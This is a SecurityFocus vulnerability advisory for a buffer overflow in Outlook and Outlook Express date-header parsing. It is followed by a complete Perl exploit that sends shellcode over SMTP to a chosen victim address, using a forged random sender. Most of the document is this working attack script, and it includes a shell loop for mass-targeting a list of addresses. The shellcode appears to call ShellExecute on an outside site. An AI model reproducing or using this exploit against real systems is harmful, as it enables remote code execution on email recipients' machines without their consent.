source: http://www.securityfocus.com/bid/1481/info

All versions of Microsoft Outlook and Outlook Express are vulnerable to buffer overflow attacks where a remote user is capable of executing arbitrary code on an email recipient's system. 

The problem lies in how Outlook and Outlook Express handles the parsing of the GMT section of the date field in the header of an email when downloading via POP3 or IMAP4. This process is handled by INETCOMM.DLL. Improper bounds checking exists on the token represented by GMT. Therefore, if a malicious user was to send a specially crafted email message containing an unusually long value in the GMT specification, the buffer would be overflowed making arbitrary code execution possible. Sending random data could cause the application to crash.

Eg:

Date: Tue, 18 July 2000 14:16:06 +1000<long string of characters>

This can also be achieved by encoding the specially formed GMT field as a MIME attachment in Outlook's MIME attached message format.

This lends itself to the possibility of a myriad of exploits, such as the execution of trojan horses, the spread of worms, gaining user level access on the target host, etc. automatically without the email recipient's consent to open an attachment or run an executable.

A user would only have to download an offending email in order to become susceptible to an attack.

#!/usr/bin/perl
#******************************************************************************
#http://www.ussrback.com Ussr Labs (Exploiteable Buffer Overflow)
# Outlook Express 5.0 | Outlook 2000 | Outlook 97.0 | Outlook 98
#******************************************************************************
#
# By: Ussr Labs
#
# Arbitary shellcode injector over SMTP
# ./$0 -h <server hostname>  -m <mail>
# ./dieoutlook.pl -h <smtp server> -m victim@address.com
# 
#
#
#For Multiple email's Spanwn do something like this:
#
# for i in `cat emailshere.txt`; do perl ./outoutlook.pl -h smtpserverip -m $i; done
#
#
#
#


use Getopt::Std;
use Socket;
getopt('h:m', \%args);

# user defined variables
if(defined($args{h})){$serv=$args{h}}else{&usage;}
if(defined($args{m})){$rcpt=$args{m}}else{&usage;}

# These are the escape characters which will cause the seg violation.
# *nix didn't like the ascii interpretation, so we send the
# characters in hex.
# +,1 ,? ,^ ,? ,z ,? ,x 

$spawn = "\x2b\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31" .
	"\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31" .
	"\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31" .
	"\x31\x31\x31\x31\x31\x31\x31\x31\x5a\xdc\xae\x20\x78\x0d\x0a";

$shellcode = "\xE8\x00\x00\x00\x00\x5D\x81\xED\x40\x10\x40\x00\x81\xC4\x00" .
	"\x03\x00\x00\xB8\x38\x10\x00\x01\x8B\x00\x89\x85\x0B\x11\x40\x00" .
	"\x8C\xC8\xA8\x04\x75\x08\x8B\x85\x1F\x11\x40\x00\xEB\x06\x8B\x85" .
	"\x23\x11\x40\x00\x89\x85\x1F\x11\x40\x00\x8D\x8D\x42\x11\x40\x00" .
	"\x51\x50\xFF\x95\x0B\x11\x40\x00\x89\x85\x0F\x11\x40\x00\x8D\x8D" .
	"\x53\x11\x40\x00\x51\xFF\x95\x0F\x11\x40\x00\x8D\x8D\x34\x11\x40" .
	"\x00\x51\x50\xFF\x95\x0B\x11\x40\x00\x89\x85\x13\x11\x40\x00\x8B" .
	"\x85\x1F\x11\x40\x00\x8D\x8D\x27\x11\x40\x00\x51\x50\xFF\x95\x0B" .
	"\x11\x40\x00\x89\x85\x17\x11\x40\x00\x8D\x85\x1B\x11\x40\x00\x50" .
	"\x6A\x00\x6A\x00\x8D\x85\xE3\x10\x40\x00\x50\x6A\x00\x6A\x00\x8B" .
	"\x85\x17\x11\x40\x00\xFF\xD0\xEB\xFE\x60\xE8\x00\x00\x00\x00\x5D" .
	"\x81\xED\xE9\x10\x40\x00\x6A\x00\x6A\x00\x6A\x00\x8D\xB5\x5F\x11" .
	"\x40\x00\x56\x6A\x00\x6A\x00\xFF\x95\x13\x11\x40\x00\x61\xC2\x10" .
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" .
	"\x00\x00\x00\x00\x00\x00\x00\xF0\x77\x00\x00\xF7\xBF\x43\x72\x65" .
	"\x61\x74\x65\x54\x68\x72\x65\x61\x64\x00\x53\x68\x65\x6C\x6C\x45" .
	"\x78\x65\x63\x75\x74\x65\x41\x00\x47\x65\x74\x4D\x6F\x64\x75\x6C" .
	"\x65\x48\x61\x6E\x64\x6C\x65\x41\x00\x73\x68\x65\x6C\x6C\x33\x32" .
	"\x2E\x64\x6C\x6C\x00\x77\x77\x77\x2E\x75\x73\x73\x72\x62\x61\x63" .
	"\x6B\x2E\x63\x6F\x6D\x00";

$ret = "00aedc5a";						# return address
$nop = "\x90";							# x86 NOP
$port = 25;							# default 25 SMTP port
$buffsize = "1348";						# buffer size
$buffer .= $nop x 945;						# load $buffer with 945 NOP then $shellcode
$buffer .= $shellcode;						# append shellcode to buffer
$offset = (hex $ret);						# return hex string to corresponding value
$code = pack("N", $offset);					# big-endian (long) network order
while (length $buffer < $buffsize) { $buffer .= $code; }
$buffer .= "\n\n";
print "$code\n";

# create random MAIL FROM field. format is: [ alphanumeric ] @ [ characters ] . [ domain ]

$max=(int rand 15);
@a=('a'..'z', '1'..'10'); for (1..$max) { $str .= $a[rand @a] }
@a=('a'..'z'); for (1..$max) { $host .= $a[rand @a] }
@dom = ('.com', '.net', '.org');
$rdom = $dom[ rand @dom ];
$rmail = $str . "@" . $host . $dom;
print "random address set to: $rmail\n";

# random date method, format: Date: <day>, <int-day> <month> 2000 <time>

@days = ('Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun');
$rday = $days[ rand @days ];
$rcal=(int rand(31));
$rhour=(int rand(23)); if ($rhour < 10){ $rhour = "0".$rhour; }
$rmin=(int rand(59)); if ($rmin < 10){ $rmin = "0".$rmin; }
$rsec=(int rand(59)); if ($rsec < 10){ $rsec = "0".$rsec; }
@months = ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Oct', 'Sep', 'Nov', 'Dec');
$rmonth = $months[ rand @months ];
$date = "Date: ".$rday.","; if ( $rcal >9 ){$date = $date."$rcal"." $rmonth"." 2000 ".$rhour.":".$rmin.":".$rsec," ";}
else { $date = $date." $rcal"." $rmonth"." 2000 ".$rhour.":".$rmin.":".$rsec," ";}
print "date set to: $date\n";

$in_addr = (gethostbyname($serv))[4] || die("Error: $!\n");
$paddr = sockaddr_in($port, $in_addr) || die ("Error: $!\n");
$proto = getprotobyname('tcp') || die("Error: $!\n");

socket(S, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(S, $paddr) || die("Error: $!\n");
select(S); $| = 1; select(STDOUT);

# begin our SMTP transaction

print "now starting SMTP transaction\n";
$res=<S>; print "$res\n";
print "sending HELO\n";
system("sleep 2s");
print S "HELO\r\n";
$res=<S>; print "$res\n";

print "sending MAIL FROM\n";
system("sleep 2s");
print S "MAIL FROM:$rmail\r\n";
$res=<S>; print "$res\n";

print "sending RCPT\n";
system("sleep 2s");
print S "RCPT TO:$rcpt\r\n";
$res=<S>; print "$res\n";

print "sending DATA\n";
system("sleep 2s");
print S "DATA\r\n";
$res=<S>; print "$res\n";

print "sending escape characters\n";
print S "$date";
print S " $spawn";

print "sending shellcode\n";
print S "$shellcode\r\n\r\n\r\n";
#$res=<S>; print "$res\n";
print S ".\r\n";
print S "QUIT\r\n";

print "shellcode spawn was successful\n";
close(S);


sub usage {die("\n\n./$0 -h <hostname> -m <mail>\n\n");}